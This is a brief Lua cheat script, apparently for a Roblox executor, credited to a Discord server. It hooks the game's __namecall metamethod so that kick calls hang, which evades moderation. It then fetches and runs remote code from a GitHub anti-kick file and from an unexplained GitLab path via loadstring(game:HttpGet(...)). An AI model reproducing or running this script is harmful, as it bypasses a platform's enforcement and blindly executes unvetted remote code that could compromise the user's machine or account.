--[[
discord.gg/thedevs
credits to Exunys (https://github.com/Exunys)
]]

local old

old = hookmetamethod(game, "__namecall", function(...)
    if getnamecallmethod() == "Kick" then 
        return wait(9e9) 
    end
    return old(...)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Anti-Kick/main/Anti%20Kick.lua"))()
loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))()
